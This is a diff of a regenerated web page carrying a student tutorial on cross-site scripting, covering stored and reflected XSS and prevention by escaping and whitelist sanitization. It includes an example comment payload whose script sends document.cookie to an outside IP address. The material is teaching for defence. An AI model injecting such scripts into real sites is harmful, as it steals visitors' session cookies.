@@ -12,119 +12,122 @@
     <link rel="stylesheet" href="..\..\..\markbind\css\bootstrap-glyphicons.min.css" >
     <link rel="stylesheet" href="..\..\..\markbind\css\github.min.css">
     <link rel="stylesheet" href="..\..\..\markbind\css\markbind.css">
-    <link rel="stylesheet" href="..\..\..\markbind\css\site-nav.css">
+    
     <link rel="stylesheet" href="/learningresources/css/gh-pages.css">
     
 </head>
 <body>
-<div id="app" class="container-fluid">
-    <div id="seedu-header">
-  <nav class="navbar navbar-lg navbar-expand navbar-light bg-lighter">
-    <div class="container">
-      <a class="navbar-brand" href="https://se-edu.github.io/"><img src="https://se-edu.github.io/images/SeEduLogo.png" alt="SE-EDU"></a>
-      <ul class="navbar-nav">
-        <li class="nav-item"><a class="nav-link" href="https://se-edu.github.io/addressbook-level1">AB-1</a></li>
-        <li class="nav-item"><a class="nav-link" href="https://se-edu.github.io/addressbook-level2">AB-2</a></li>
-        <li class="nav-item"><a class="nav-link" href="https://se-edu.github.io/addressbook-level3">AB-3</a></li>
-        <li class="nav-item"><a class="nav-link" href="https://se-edu.github.io/addressbook-level4">AB-4</a></li>
-        <li class="nav-item"><a class="nav-link" href="https://se-edu.github.io/collate">Collate</a></li>
-        <li class="nav-item"><a class="nav-link" href="https://se-edu.github.io/se-book">Book</a></li>
-        <li class="nav-item"><a class="nav-link active" href="/learningresources/index.html">Resources</a></li>
-      </ul>
-    </div>
-  </nav>
-</div>
-<div id="site-header">
-  <nav class="navbar navbar-expand navbar-light bg-light">
-    <div class="container">
-      <a class="navbar-brand" href="/learningresources/index.html">Learning Resources for Software Engineering Students</a>
-      <ul class="navbar-nav"></ul>
-      <form class="navbar-form">
-        <searchbar :data="searchData" placeholder="Search" :on-hit="searchCallback" menu-align-right=""></searchbar>
-      </form>
-    </div>
-  </nav>
-</div>
-<div class="website-content">
-  <h1 id="cross-site-scripting">Cross Site Scripting</h1>
-  <p>Author: <a href="https://github.com/nus-oss/cs3281-website/tree/master/students/AY1617S2/tanWangLeng/TanWangLeng-Resume.md">Tan Wang Leng</a></p>
-  <h2 id="overview">Overview</h2>
-  <p>Cross site scripting (XSS) is a vulnerability found in websites.</p>
-  <p>Text boxes are commonly used in forms in websites to ask the user for input. For example, blog websites may provide a text box for visitors of the blog to enter comments.</p>
-  <p>However, are commenters limited to just typing in plain text? Some websites do not check the input, thus commenters are able to use formatting HTML tags, such as <code>&lt;b&gt;</code> for bolding and <code>&lt;i&gt;</code> for italicizing.</p>
-  <pre><code class="hljs html">I <span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>like<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span> your blog post!
+<div id="app">
+    <div id="content-wrapper">
+  <div id="seedu-header">
+    <nav class="navbar navbar-lg navbar-expand navbar-light bg-lighter">
+      <div class="container">
+        <a class="navbar-brand" href="https://se-edu.github.io/"><img src="https://se-edu.github.io/images/SeEduLogo.png" alt="SE-EDU"></a>
+        <ul class="navbar-nav">
+          <li class="nav-item"><a class="nav-link" href="https://se-edu.github.io/addressbook-level1">AB-1</a></li>
+          <li class="nav-item"><a class="nav-link" href="https://se-edu.github.io/addressbook-level2">AB-2</a></li>
+          <li class="nav-item"><a class="nav-link" href="https://se-edu.github.io/addressbook-level3">AB-3</a></li>
+          <li class="nav-item"><a class="nav-link" href="https://se-edu.github.io/addressbook-level4">AB-4</a></li>
+          <li class="nav-item"><a class="nav-link" href="https://se-edu.github.io/collate">Collate</a></li>
+          <li class="nav-item"><a class="nav-link" href="https://se-edu.github.io/se-book">Book</a></li>
+          <li class="nav-item"><a class="nav-link active" href="/learningresources/index.html">Resources</a></li>
+        </ul>
+      </div>
+    </nav>
+  </div>
+  <div id="site-header">
+    <nav class="navbar navbar-expand navbar-light bg-light">
+      <div class="container">
+        <a class="navbar-brand" href="/learningresources/index.html">Learning Resources for Software Engineering Students</a>
+        <ul class="navbar-nav"></ul>
+        <form class="navbar-form">
+          <searchbar :data="searchData" placeholder="Search" :on-hit="searchCallback" menu-align-right=""></searchbar>
+        </form>
+      </div>
+    </nav>
+  </div>
+  <div class="website-content">
+    <h1 id="cross-site-scripting">Cross Site Scripting</h1>
+    <p>Author: <a href="https://github.com/nus-oss/cs3281-website/tree/master/students/AY1617S2/tanWangLeng/TanWangLeng-Resume.md">Tan Wang Leng</a></p>
+    <h2 id="overview">Overview</h2>
+    <p>Cross site scripting (XSS) is a vulnerability found in websites.</p>
+    <p>Text boxes are commonly used in forms in websites to ask the user for input. For example, blog websites may provide a text box for visitors of the blog to enter comments.</p>
+    <p>However, are commenters limited to just typing in plain text? Some websites do not check the input, thus commenters are able to use formatting HTML tags, such as <code>&lt;b&gt;</code> for bolding and <code>&lt;i&gt;</code> for italicizing.</p>
+    <pre><code class="hljs html">I <span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>like<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span> your blog post!
 </code></pre>
-  <p>becomes: I <strong>like</strong> your blog post!</p>
-  <p>The problem arises when the commenter starts using HTML for malicious purposes. For example, HTML also supports <code>&lt;script&gt;</code>, for you to write JavaScript code on the webpage as well.</p>
-  <pre><code class="hljs html">This is an innocent looking comment. <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">sendToServer(<span class="hljs-string">"http://139.241.0.3/"</span>, <span class="hljs-built_in">document</span>.cookie)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+    <p>becomes: I <strong>like</strong> your blog post!</p>
+    <p>The problem arises when the commenter starts using HTML for malicious purposes. For example, HTML also supports <code>&lt;script&gt;</code>, for you to write JavaScript code on the webpage as well.</p>
+    <pre><code class="hljs html">This is an innocent looking comment. <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">sendToServer(<span class="hljs-string">"http://139.241.0.3/"</span>, <span class="hljs-built_in">document</span>.cookie)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
 </code></pre>
-  <p>While visitors of the blog will only see the non-script portion of the comments (i.e. <code>This is an innocent looking comment.</code>), the browser will not show the script portion of the comment, because it is legal HTML (you won't see the tags like
-    <code>&lt;b&gt;</code> and <code>&lt;i&gt;</code> when viewing webpages, so you definitely won't see
-    <code>&lt;script&gt;</code> on the webpage).</p>
-  <p>However, the browser is <strong>actually executing the script</strong>, without the visitor even being aware of what's going on.</p>
-  <p>This means that any malicious users (i.e. hackers) can write a script on their comments, such that everyone that visits the website will have the script executed. The script can be malicious in nature (in our example, the script sends the cookie of
-    the visitor to the hacker).</p>
-  <p>Therefore, the hacker has managed to add additional malicious &quot;functionality&quot; to the website, that is not intended by the original website developer.</p>
-  <blockquote>
-    <p>Trivia: The term &quot;Cross Site Scripting&quot; is actually an old term. It originally describe an attack whereby hackers write malicious JavaScript scripts on a separate website, and injects it into the victim's website, in order to steal data
-      from the victim's website/deface the page (hence &quot;Cross Site&quot;). Such attacks are no longer possible today, and the modern definition of &quot;Cross Site Scripting&quot; includes attacks that do not need to be on a separate website to work.</p>
-  </blockquote>
-  <h2 id="types-of-cross-site-scripting">Types of Cross Site Scripting</h2>
-  <p>There are no standard definitions, but there are at least two different types of XSS:
-  </p>
-  <ul>
-    <li>
-      <p>Persistent XSS (also known as stored XSS) - The JavaScript code gets stored in the web server. Example: Posting a malicious JavaScript code into a blog post as a comment. The comment gets stored in the database, and the web browser of future visitors
-        of the webpage will retrieve the comment from the database, resulting in execution.</p>
-    </li>
-    <li>
-      <p>Non-persistent XSS (also known as reflected XSS) - The JavaScript code is inserted in URL/links of website that accepts URL parameters as input. The input is therefore not stored in a database.</p>
-    </li>
-  </ul>
-  <p>An example of a non-persistent XSS attack would be an e-card website that displays an e-card to a visitor of the website. The e-card can be customised by modifying the <code>content</code> parameter of the URL:</p>
-  <p><code>https://www.ecard.com/view-ecard.php?content=Happy%20Holidays</code></p>
-  <p>However, that also means that hackers are able to also include scripts in their e-card content. They can send this URL to victims, hoping that they will click on them, resulting in the scripts being executed:</p>
-  <p><code>https://www.ecard.com/view-ecard.php?content=Happy%20Holidays&lt;script&gt;...&lt;/script&gt;</code></p>
-  <h2 id="preventing-cross-site-scripting">Preventing Cross Site Scripting</h2>
-  <p>There are a couple of ways to prevent your website against XSS. The two most common ways are:</p>
-  <ul>
-    <li>
-      <p>Escaping String Input: By converting legal HTML characters to their display-equivalent (e.g. <code>&lt;</code> to <code>&amp;lt;</code>), you prevent the symbol from being parsed as HTML. It now even shows the content on the screen (in case the
-        actual intention is to actually show someone how to code for example).</p>
-    </li>
-    <li>
-      <p>Whitelist Sanitization: By scanning and parsing the input as HTML, you can remove undesired HTML elements, and only allowing certain whitelisted HTML elements to be used (e.g. whitelisting only <code>&lt;b&gt;</code> and <code>&lt;i&gt;</code>).</p>
-    </li>
-  </ul>
-  <h2 id="resources">Resources</h2>
-  <p>References:</p>
-  <ol>
-    <li><a href="http://projects.webappsec.org/f/WASC-TC-v2_0.pdf">http://projects.webappsec.org/f/WASC-TC-v2_0.pdf</a> (page 32 &amp; 33) (Basic description of the XSS attack taken from here)</li>
-    <li><a href="https://www.owasp.org/index.php/Cross-site_Scripting_%28XSS%29#Stored_and_Reflected_XSS_Attacks">https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)#Stored_and_Reflected_XSS_Attacks</a> (Description of the two types of XSS attack taken
-      from here)</li>
-    <li><a href="http://blog.jeremiahgrossman.com/2006/07/origins-of-cross-site-scripting-xss.html">http://blog.jeremiahgrossman.com/2006/07/origins-of-cross-site-scripting-xss.html</a> (Origin of the name &quot;Cross Site Scripting&quot;)</li>
-  </ol>
-  <p>Additional Reading Resources:</p>
-  <ol>
-    <li><a href="https://www.owasp.org/index.php/Testing_for_Cross_site_scripting">https://www.owasp.org/index.php/Testing_for_Cross_site_scripting</a> (How to test your website for XSS attacks)</li>
-    <li><a href="https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet">https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet</a> (A list of possible preventions, which contains even more ways to
-      protect your site from XSS attacks).</li>
-    <li><a href="http://guides.rubyonrails.org/security.html#cross-site-scripting-xss">http://guides.rubyonrails.org/security.html#cross-site-scripting-xss</a> (In-depth discussion of how XSS attacks work, the different possible scenarios of such attacks,
-      and possible preventive measures)</li>
-    <li><a href="https://www.owasp.org/index.php/DOM_Based_XSS">https://www.owasp.org/index.php/DOM_Based_XSS</a> (Discussion about DOM-based XSS attacks, a third possible type of XSS attacks)</li>
-    <li><a href="https://excess-xss.com/">https://excess-xss.com/</a> (Comprehensive coverage of <em>all</em> aspects of XSS)</li>
-  </ol>
-  <p>Additional Resources:</p>
-  <ol>
-    <li><a href="https://github.com/OWASP/java-html-sanitizer">https://github.com/OWASP/java-html-sanitizer</a> (Java Sanitization framework) (Implementation of HTML sanitization in Java)</li>
-    <li><a href="https://github.com/rails/rails_xss">https://github.com/rails/rails_xss</a> (Ruby on Rails plugin responsible for escaping String input in Ruby on Rails websites)</li>
-    <li><a href="http://api.rubyonrails.org/classes/ActionView/Helpers/SanitizeHelper.html">http://api.rubyonrails.org/classes/ActionView/Helpers/SanitizeHelper.html</a> (Ruby on Rails HTML sanitization function)</li>
-  </ol>
+    <p>While visitors of the blog will only see the non-script portion of the comments (i.e. <code>This is an innocent looking comment.</code>), the browser will not show the script portion of the comment, because it is legal HTML (you won't see the tags
+      like <code>&lt;b&gt;</code> and <code>&lt;i&gt;</code> when viewing webpages, so you definitely won't see
+      <code>&lt;script&gt;</code> on the webpage).</p>
+    <p>However, the browser is <strong>actually executing the script</strong>, without the visitor even being aware of what's going on.</p>
+    <p>This means that any malicious users (i.e. hackers) can write a script on their comments, such that everyone that visits the website will have the script executed. The script can be malicious in nature (in our example, the script sends the cookie of
+      the visitor to the hacker).</p>
+    <p>Therefore, the hacker has managed to add additional malicious &quot;functionality&quot; to the website, that is not intended by the original website developer.</p>
+    <blockquote>
+      <p>Trivia: The term &quot;Cross Site Scripting&quot; is actually an old term. It originally describe an attack whereby hackers write malicious JavaScript scripts on a separate website, and injects it into the victim's website, in order to steal data
+        from the victim's website/deface the page (hence &quot;Cross Site&quot;). Such attacks are no longer possible today, and the modern definition of &quot;Cross Site Scripting&quot; includes attacks that do not need to be on a separate website to
+        work.</p>
+    </blockquote>
+    <h2 id="types-of-cross-site-scripting">Types of Cross Site Scripting</h2>
+    <p>There are no standard definitions, but there are at least two different types of XSS:
+    </p>
+    <ul>
+      <li>
+        <p>Persistent XSS (also known as stored XSS) - The JavaScript code gets stored in the web server. Example: Posting a malicious JavaScript code into a blog post as a comment. The comment gets stored in the database, and the web browser of future visitors
+          of the webpage will retrieve the comment from the database, resulting in execution.</p>
+      </li>
+      <li>
+        <p>Non-persistent XSS (also known as reflected XSS) - The JavaScript code is inserted in URL/links of website that accepts URL parameters as input. The input is therefore not stored in a database.</p>
+      </li>
+    </ul>
+    <p>An example of a non-persistent XSS attack would be an e-card website that displays an e-card to a visitor of the website. The e-card can be customised by modifying the <code>content</code> parameter of the URL:</p>
+    <p><code>https://www.ecard.com/view-ecard.php?content=Happy%20Holidays</code></p>
+    <p>However, that also means that hackers are able to also include scripts in their e-card content. They can send this URL to victims, hoping that they will click on them, resulting in the scripts being executed:</p>
+    <p><code>https://www.ecard.com/view-ecard.php?content=Happy%20Holidays&lt;script&gt;...&lt;/script&gt;</code></p>
+    <h2 id="preventing-cross-site-scripting">Preventing Cross Site Scripting</h2>
+    <p>There are a couple of ways to prevent your website against XSS. The two most common ways are:</p>
+    <ul>
+      <li>
+        <p>Escaping String Input: By converting legal HTML characters to their display-equivalent (e.g. <code>&lt;</code> to <code>&amp;lt;</code>), you prevent the symbol from being parsed as HTML. It now even shows the content on the screen (in case the
+          actual intention is to actually show someone how to code for example).</p>
+      </li>
+      <li>
+        <p>Whitelist Sanitization: By scanning and parsing the input as HTML, you can remove undesired HTML elements, and only allowing certain whitelisted HTML elements to be used (e.g. whitelisting only <code>&lt;b&gt;</code> and <code>&lt;i&gt;</code>).</p>
+      </li>
+    </ul>
+    <h2 id="resources">Resources</h2>
+    <p>References:</p>
+    <ol>
+      <li><a href="http://projects.webappsec.org/f/WASC-TC-v2_0.pdf">http://projects.webappsec.org/f/WASC-TC-v2_0.pdf</a> (page 32 &amp; 33) (Basic description of the XSS attack taken from here)</li>
+      <li><a href="https://www.owasp.org/index.php/Cross-site_Scripting_%28XSS%29#Stored_and_Reflected_XSS_Attacks">https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)#Stored_and_Reflected_XSS_Attacks</a> (Description of the two types of XSS attack
+        taken from here)</li>
+      <li><a href="http://blog.jeremiahgrossman.com/2006/07/origins-of-cross-site-scripting-xss.html">http://blog.jeremiahgrossman.com/2006/07/origins-of-cross-site-scripting-xss.html</a> (Origin of the name &quot;Cross Site Scripting&quot;)</li>
+    </ol>
+    <p>Additional Reading Resources:</p>
+    <ol>
+      <li><a href="https://www.owasp.org/index.php/Testing_for_Cross_site_scripting">https://www.owasp.org/index.php/Testing_for_Cross_site_scripting</a> (How to test your website for XSS attacks)</li>
+      <li><a href="https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet">https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet</a> (A list of possible preventions, which contains even more ways
+        to protect your site from XSS attacks).</li>
+      <li><a href="http://guides.rubyonrails.org/security.html#cross-site-scripting-xss">http://guides.rubyonrails.org/security.html#cross-site-scripting-xss</a> (In-depth discussion of how XSS attacks work, the different possible scenarios of such attacks,
+        and possible preventive measures)</li>
+      <li><a href="https://www.owasp.org/index.php/DOM_Based_XSS">https://www.owasp.org/index.php/DOM_Based_XSS</a> (Discussion about DOM-based XSS attacks, a third possible type of XSS attacks)</li>
+      <li><a href="https://excess-xss.com/">https://excess-xss.com/</a> (Comprehensive coverage of <em>all</em> aspects of XSS)</li>
+    </ol>
+    <p>Additional Resources:</p>
+    <ol>
+      <li><a href="https://github.com/OWASP/java-html-sanitizer">https://github.com/OWASP/java-html-sanitizer</a> (Java Sanitization framework) (Implementation of HTML sanitization in Java)</li>
+      <li><a href="https://github.com/rails/rails_xss">https://github.com/rails/rails_xss</a> (Ruby on Rails plugin responsible for escaping String input in Ruby on Rails websites)</li>
+      <li><a href="http://api.rubyonrails.org/classes/ActionView/Helpers/SanitizeHelper.html">http://api.rubyonrails.org/classes/ActionView/Helpers/SanitizeHelper.html</a> (Ruby on Rails HTML sanitization function)</li>
+    </ol>
+  </div>
 </div>
 <div id="flex-div"></div>
 <footer>
   <div class="text-center">
-    <small>[Generated by <a href="https://markbind.github.io/markbind/">MarkBind 1.10.0</a> on Sat, 28 Jul 2018 08:04:24 GMT]</small></div>
+    <small>[Generated by <a href="https://markbind.github.io/markbind/">MarkBind 1.12.0</a> on Sat, 08 Sep 2018 08:13:07 GMT]</small></div>
 </footer>
 </div>
 </body>
